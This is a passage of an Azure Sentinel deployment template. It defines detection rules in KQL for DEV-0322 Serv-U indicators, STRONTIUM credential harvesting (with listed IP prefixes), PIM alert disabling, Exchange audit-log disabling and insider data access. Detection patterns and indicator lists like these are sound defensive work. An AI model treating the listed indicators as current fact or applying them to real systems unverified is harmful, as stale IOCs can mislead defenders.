InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName,  InitiatingProcessSHA256, Type, CommandLineIP, AccountName\n| extend Account = AccountName, Computer = DeviceName, IPAddress = CommandLineIP, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash, IPCustomEntity = IPAddress\n),\n(  SecurityEvent\n| where EventID == 4688\n| extend CommandLineIP = extract(IPRegex, 0, CommandLine)\n| where CommandLineIP in (IPList) or (NewProcessName  has_any (process) and ParentProcessName has_any (parentprocess))\n| project TimeGenerated, Computer, NewProcessName, ParentProcessName, Account, NewProcessId, Type, CommandLine, CommandLineIP\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = NewProcessName, AlertDetail = 'Dev-0322 IOC match', IPCustomEntity = CommandLineIP\n)\n)",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1190"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "4759ddb4-2daf-43cb-b34e-d85b85b4e4a5",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessCustomEntity"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "AlgorithmCustomEntity"
                },
                {
                  "identifier": "Value",
                  "columnName": "FileHashCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/4864f7cf-bf51-4ae8-b5f2-436af414c188')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/4864f7cf-bf51-4ae8-b5f2-436af414c188')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "DEV-0322 Serv-U related IOCs - July 2021",
          "description": "Identifies a match across IOC's related to DEV-0322 targeting SolarWinds Serv-U software.",
          "severity": "High",
          "enabled": true,
          "query": "let iocs = externaldata(DateAdded:string,IoC:string,Type:string,TLP:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/DEV-0322_SolarWinds_Serv-U_IoC.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet process = (iocs | where Type =~ \"process\" | project IoC);\nlet parentprocess = (iocs | where Type =~ \"parentprocess\" | project IoC);\nlet IPList = (iocs | where Type =~ \"ip\"| project IoC);\nlet IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}';\n(union isfuzzy=true\n(CommonSecurityLog\n| where SourceIP in (IPList) or DestinationIP in (IPList) or RequestURL has_any (IPList) or Message has_any (IPList)\n| project TimeGenerated, SourceIP, DestinationIP, Message, SourceUserID, RequestURL, Type\n| extend MessageIP = extract(IPRegex, 0, Message)\n| extend IPMatch = case(SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", MessageIP in (IPList), \"Message\", RequestURL in (IPList), \"RequestUrl\",\"NoMatch\"), AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, IPMatch == \"Message\", MessageIP, IPMatch == \"RequestUrl\", RequestURL, \"NoMatch\"), AccountCustomEntity = SourceUserID\n),\n(DnsEvents\n| where IPAddresses in (IPList)  \n| project TimeGenerated, Computer, IPAddresses, Name, ClientIP, Type\n| extend DestinationIPAddress = IPAddresses, DNSName = Name, Host = Computer , AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIPAddress, HostCustomEntity = Host\n),\n(VMConnection\n| where SourceIp in (IPList) or DestinationIp in (IPList)\n| parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n| project TimeGenerated, Computer, Direction, ProcessName, SourceIp, DestinationIp, DestinationPort, RemoteDnsQuestions, DNSName,BytesSent, BytesReceived, RemoteCountry, Type\n| extend IPMatch = case( SourceIp in (IPList), \"SourceIP\", DestinationIp in (IPList), \"DestinationIP\", \"None\") , AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIp, IPMatch == \"DestinationIP\", DestinationIp, \"NoMatch\"), HostCustomEntity = Computer, ProcessCustomEntity = ProcessName\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 3\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend SourceIP = EventDetail.[9].[\"#text\"], DestinationIP = EventDetail.[14].[\"#text\"], Image = EventDetail.[4].[\"#text\"]\n| where SourceIP in (IPList) or DestinationIP in (IPList) \n| project TimeGenerated, SourceIP, DestinationIP, Image, UserName, Computer, Type\n| extend IPMatch = case( SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"None\") , AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserName, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), HostCustomEntity = Computer , IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"None\")\n),  \n(OfficeActivity\n| where ClientIP in (IPList) \n| project TimeGenerated, UserAgent, Operation, RecordType, UserId, ClientIP, AlertDetail = 'Dev-0322 IOC match', Type\n| extend timestamp = TimeGenerated, IPCustomEntity = ClientIP, AccountCustomEntity = UserId\n),\n(DeviceNetworkEvents\n| where  RemoteIP in (IPList)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, RemoteIP, RemoteUrl, RemotePort, LocalIP, Type\n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName,  AlertDetail = 'Dev-0322 IOC match', UrlCustomEntity =RemoteUrl, ProcessCustomEntity = InitiatingProcessFileName\n),\n(WindowsFirewall\n| where SourceIP in (IPList) or DestinationIP in (IPList) \n| project TimeGenerated, Computer, CommunicationDirection, SourceIP, DestinationIP, SourcePort, DestinationPort, Type\n| extend IPMatch = case( SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"None\"), AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"None\")\n),\n(AzureDiagnostics\n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallDnsProxy\"\n| project TimeGenerated,Resource, msg_s, Type\n| parse msg_s with \"DNS Request: \" ClientIP \":\" ClientPort \" - \" QueryID \" \" Request_Type \" \" Request_Class \" \" Request_Name \". \" Request_Protocol \" \" Request_Size \" \" EDNSO_DO \" \" EDNS0_Buffersize \" \" Responce_Code \" \" Responce_Flags \" \" Responce_Size \" \" Response_Duration\n| where  ClientIP in (IPList)\n| extend timestamp = TimeGenerated, DNSName = Request_Name, IPCustomEntity = ClientIP, AlertDetail = 'Dev-0322 IOC match'\n),\n(AzureDiagnostics \n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| project TimeGenerated,Resource, msg_s\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where SourceHost in (IPList)\n| extend timestamp = TimeGenerated, DNSName = DestinationHost, IPCustomEntity = SourceHost, AlertDetail = 'Dev-0322 IOC match'\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend ParentImage = EventDetail.[20].[\"#text\"], Image = EventDetail.[4].[\"#text\"]\n| where ( ParentImage has_any (parentprocess) and Image has_any (process))\n| parse EventDetail with * 'SHA256=' SHA256 '\",' *\n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, SHA256,Image, ParentImage \n| extend Type = strcat(Type, \": \", Source), Account = UserName, FileHash = SHA256, AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(DeviceFileEvents\n| extend CommandLineIP = extract(IPRegex, 0,InitiatingProcessCommandLine)\n| where (InitiatingProcessFileName in (process) and InitiatingProcessParentFileName in (parentprocess))  or CommandLineIP in (IPList)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, RequestAccountName, RequestSourceIP, InitiatingProcessSHA256, Type, CommandLineIP\n| extend Account = RequestAccountName, Computer = DeviceName, IPAddress = RequestSourceIP, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash, IPCustomEntity = CommandLineIP\n),\n(DeviceEvents\n| extend CommandLineIP = extract(IPRegex, 0,InitiatingProcessCommandLine)\n| where (InitiatingProcessFileName in (process) and InitiatingProcessParentFileName in (parentprocess)) or CommandLineIP in (IPList)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type, CommandLineIP\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath, AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash, IPCustomEntity = CommandLineIP\n),\n(DeviceProcessEvents\n| extend CommandLineIP = extract(IPRegex, 0,InitiatingProcessCommandLine)\n| where (InitiatingProcessFileName in (process) and InitiatingProcessParentFileName in (parentprocess))  or CommandLineIP in (IPList)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName,  InitiatingProcessSHA256, Type, CommandLineIP, AccountName\n| extend Account = AccountName, Computer = DeviceName, IPAddress = CommandLineIP, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash, IPCustomEntity = IPAddress\n),\n(  SecurityEvent\n| where EventID == 4688\n| extend CommandLineIP = extract(IPRegex, 0, CommandLine)\n| where CommandLineIP in (IPList) or (NewProcessName  has_any (process) and ParentProcessName has_any (parentprocess))\n| project TimeGenerated, Computer, NewProcessName, ParentProcessName, Account, NewProcessId, Type, CommandLine, CommandLineIP\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = NewProcessName, AlertDetail = 'Dev-0322 IOC match', IPCustomEntity = CommandLineIP\n)\n)",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1190"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "4759ddb4-2daf-43cb-b34e-d85b85b4e4a5",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessCustomEntity"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "AlgorithmCustomEntity"
                },
                {
                  "identifier": "Value",
                  "columnName": "FileHashCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/cb36d3ad-0ca6-41d8-b6df-a3fda8e979ff')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/cb36d3ad-0ca6-41d8-b6df-a3fda8e979ff')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "(Preview) Insider Risk - Sensitive Data Access Outside Organizational Geo-location",
          "description": "This alert joins Azure Information Protection Logs (InformationProtectionLogs_CL) with Azure Active Directory Sign in Logs (SigninLogs) to provide a correlation of sensitive data access by geo-location. Results include User Principal Name, Label Name, Activity, City, State, Country/Region, and Time Generated. Recommended configuration is to include (or exclude) Sign in geo-locations (City, State, Country and/or Region) for trusted organizational locations. There is an option for configuration of correlations against Azure Sentinel watchlists. Accessing sensitive data from a new or unauthorized geo-location warrants further review. For more information see [Sign-in logs in Azure Active Directory: Location Filtering](https://docs.microsoft.com/azure/active-directory/reports-monitoring/concept-sign-ins)",
          "severity": "High",
          "enabled": false,
          "query": "InformationProtectionLogs_CL\n| extend UserPrincipalName = UserId_s\n| where LabelName_s <> \"\"\n| join kind=inner (SigninLogs) on UserPrincipalName\n| extend City = tostring(LocationDetails.city)\n// | where City <> \"New York\" // Configure Location Details within Organizational Requirements\n| extend State = tostring(LocationDetails.state)\n// | where State <> \"Texas\" // Configure Location Details within Organizational Requirements\n| extend Country_Region = tostring(LocationDetails.countryOrRegion)\n// | where Country_Region <> \"US\" // Configure Location Details within Organizational Requirements\n// | lookup kind=inner _GetWatchlist('<Your Watchlist Name>') on $left.UserPrincipalName == $right.SearchKey\n| summarize count() by UserPrincipalName, LabelName_s, Activity_s, City, State, Country_Region, TimeGenerated\n| sort by count_ desc\n| limit 25\n| extend AccountCustomEntity = UserPrincipalName\n",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8dbb0df9-42bd-424f-a449-4dcfd9631cde')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8dbb0df9-42bd-424f-a449-4dcfd9631cde')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Possible STRONTIUM attempted credential harvesting - Sept 2020",
          "description": "Surfaces potential STRONTIUM group Office365 credential harvesting attempts within OfficeActivity Logon events.\nReferences: https://www.microsoft.com/security/blog/2020/09/10/strontium-detecting-new-patters-credential-harvesting/.",
          "severity": "Low",
          "enabled": true,
          "query": "let IPs = dynamic ([\"199.249.230.\",\"185.220.101.\",\"23.129.64.\",\"109.70.100.\",\"185.220.102.\"]);\nOfficeActivity\n| where RecordType in (\"AzureActiveDirectoryAccountLogon\", \"AzureActiveDirectoryStsLogon\") \n| where Operation != 'UserLoggedIn'\n| extend UserAgent = iff(parse_json(ExtendedProperties)[0].Name =~ \"UserAgent\", extractjson(\"$[0].Value\", ExtendedProperties, typeof(string)),\"\")\n| mv-expand parse_json(ExtendedProperties)\n| where ExtendedProperties.Name =~ \"RequestType\"\n| extend RequestType = ExtendedProperties.Value\n| where ClientIP has_any (IPs)\n| summarize authAttempts=dcount(TimeGenerated), firstAttempt=min(TimeGenerated), lastAttempt=max(TimeGenerated), uniqueIPs=dcount(ClientIP), uniqueAccounts=dcount(UserId), attemptedAccounts=make_set(UserId) by UserAgent\n| where authAttempts > 2500\n| extend timestamp = firstAttempt\n| sort by uniqueAccounts",
          "queryFrequency": "P7D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "04384937-e927-4595-8f3c-89ff58ed231f",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/bfc1d62d-6d4c-411a-9e91-84527dc150e5')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/bfc1d62d-6d4c-411a-9e91-84527dc150e5')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detect PIM Alert Disabling activity",
          "description": "Privileged Identity Management (PIM) generates alerts when there is suspicious or unsafe activity in Azure Active Directory (Azure AD) organization. \nThis query will help detect attackers attempts to disable in product PIM alerts which are associated with Azure MFA requirements and could indicate activation of privileged access",
          "severity": "Medium",
          "enabled": true,
          "query": "AuditLogs\n| where LoggedByService =~ \"PIM\"\n| where Category =~ \"RoleManagement\"\n| where ActivityDisplayName has \"Disable PIM Alert\"\n| extend IpAddress = case(\n  isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)) and tostring(parse_json(tostring(InitiatedBy.user)).ipAddress) != 'null', tostring(parse_json(tostring(InitiatedBy.user)).ipAddress), \n  isnotempty(tostring(parse_json(tostring(InitiatedBy.app)).ipAddress)) and tostring(parse_json(tostring(InitiatedBy.app)).ipAddress) != 'null', tostring(parse_json(tostring(InitiatedBy.app)).ipAddress),\n  'Not Available')\n| extend InitiatedBy = iff(isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)), \n  tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), tostring(parse_json(tostring(InitiatedBy.app)).displayName)), UserRoles = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n| project InitiatedBy, ActivityDateTime, ActivityDisplayName, IpAddress, AADOperationType, AADTenantId, ResourceId, CorrelationId, Identity\n| extend timestamp = ActivityDateTime, IPCustomEntity = IpAddress, AccountCustomEntity = tolower(InitiatedBy), ResourceCustomEntity = ResourceId",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1098",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "1f3b4dfd-21ff-4ed3-8e27-afc219e05c50",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "AzureResource",
              "fieldMappings": [
                {
                  "identifier": "ResourceId",
                  "columnName": "ResourceCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/eadb479e-cb91-486e-a329-cac9b7adb49f')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/eadb479e-cb91-486e-a329-cac9b7adb49f')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MicrosoftSecurityIncidentCreation",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Create incidents based on Azure Active Directory Identity Protection alerts",
          "description": "Create incidents based on all alerts generated in Azure Active Directory Identity Protection",
          "enabled": true,
          "productFilter": "Azure Active Directory Identity Protection",
          "severitiesFilter": null,
          "displayNamesFilter": null,
          "displayNamesExcludeFilter": null,
          "alertRuleTemplateName": "532c1811-79ee-4d9f-8d4d-6304c840daa1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/ccc7933e-da9a-413c-834f-d1ece5639815')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/ccc7933e-da9a-413c-834f-d1ece5639815')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MicrosoftSecurityIncidentCreation",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Create incidents based on Azure Active Directory Identity Protection alerts",
          "description": "Create incidents based on all alerts generated in Azure Active Directory Identity Protection",
          "enabled": true,
          "productFilter": "Azure Active Directory Identity Protection",
          "severitiesFilter": null,
          "displayNamesFilter": null,
          "displayNamesExcludeFilter": null,
          "alertRuleTemplateName": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/ba60a15e-c8f2-46e3-aa83-ebfb3a922d10')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/ba60a15e-c8f2-46e3-aa83-ebfb3a922d10')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Exchange AuditLog disabled",
          "description": "Identifies when the exchange audit logging has been disabled which may be an adversary attempt\nto evade detection or avoid other defenses.",
          "severity": "Medium",
          "enabled": true,
          "query": "let timeframe = 1d;\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where UserType in~ (\"Admin\",\"DcAdmin\") \n// Only admin or global-admin can disable audit logging\n| where Operation =~ \"Set-AdminAuditLogConfig\" \n| extend AdminAuditLogEnabledValue = tostring(parse_json(tostring(parse_json(tostring(array_slice(parse_json(Parameters),3,3)))[0])).Value)\n| where AdminAuditLogEnabledValue =~ \"False\" \n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), OperationCount = count() by Operation, UserType, UserId, ClientIP, ResultStatus, Parameters, AdminAuditLogEnabledValue\n| extend timestamp = StartTimeUtc, AccountCustomEntity = UserId, IPCustomEntity = ClientIP",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "194dd92e-d6e7-4249-85a5-273350a7f5ce",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/58221b60-fda9-4cc5-867d-6f7dd53ae5ad')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/58221b60-fda9-4cc5-867d-6f7dd53ae5ad')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Malicious Inbox Rule",
          "description": "Often times after the initial compromise the attackers create inbox rules to delete emails that contain certain keywords. \n This is done so as to limit ability to warn compromised users that they've been compromised. Below is a sample query that tries to detect this.\nReference: https://www.reddit.com/r/sysadmin/comments/7kyp0a/recent_phishing_attempts_my_experience_and_what/",
          "severity": "Medium",
          "enabled": true,
